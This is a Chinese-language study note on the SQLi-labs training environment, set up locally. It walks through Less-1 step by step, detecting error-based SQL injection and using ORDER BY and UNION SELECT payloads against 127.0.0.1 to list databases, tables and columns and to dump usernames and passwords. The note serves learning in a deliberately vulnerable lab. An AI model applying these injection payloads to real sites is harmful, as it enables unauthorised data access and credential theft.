# SQLI-LABS学习笔记

sql注入漏洞作为传统漏洞中非常重要的一种，为了加深自己对sql注入的理解，我在本地搭建了sqllab进行学习。我用之前下载好的xampp在本地搭建环境，Sqli-labs 项目地址---Github 获取：https://github.com/Audi-1/sqli-labs

sqlilab打开后是这个样子：

**![1545023502349](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545023502349.png)**

点开第less-1后的url:![1545026187065](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545026187065.png)

加上id=1再加上'：![1545026282867](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545026282867.png)

页面显示：![1545026321740](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545026321740.png)

此时就知道存在sql注入漏洞

报错内容的关键部分： ''1'' LIMIT 0,1'

分析一下 ，先把最外面的一层单引号去掉变成：'1''LIMT 0,1

limit0,1 是显示第0到1条信息，可以暂时不用看，只要看'1''

其中1是刚才自己加的id=1的1，所以=后面的就是' '里面的内容，之前=后面输入的是1'所以就变成了'1''

现在输入1’or 1=1--+（--+用于注释）此时sql语句变成了Select ****** where id='1'or 1=1--+' LIMIT 0,1（--+后面的内容不用看因为被注释了）

然后用order by 语句，再用union select语句爆库名，表名，列名，字段：

1. 用order by+数字，确定具体数值，此处应为3

2. 爆数据库：

   http://127.0.0.1/sqli-labs-master/Less-?1/id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+

（group_concat(schema_name)作用是将schema_name里的内容在一行打印出来）

结果：![1545029000286](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545029000286.png)

3. 爆security 数据库的数据表：

   http://127.0.0.1/sqli-labs-master/Less-1/?id=-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security‘--+

结果：![1545029131519](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545029131519.png)

4. 爆 users 表的列：

   http://127.0.0.1/sql-labs-master/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

结果：

![1545029480326](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545029480326.png)

5. 爆数据：

   http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1,username,password from users where id=2--+

![1545029070166](C:\Users\tony\AppData\Roaming\Typora\typora-user-images\1545029070166.png)

注入语句的构造还有别的函数可以用，上面的只是一种。

less1-4的方法和上面的都是一样只是id=后面跟的内容略有差异，具体跟什么根据尝试和报错来分析。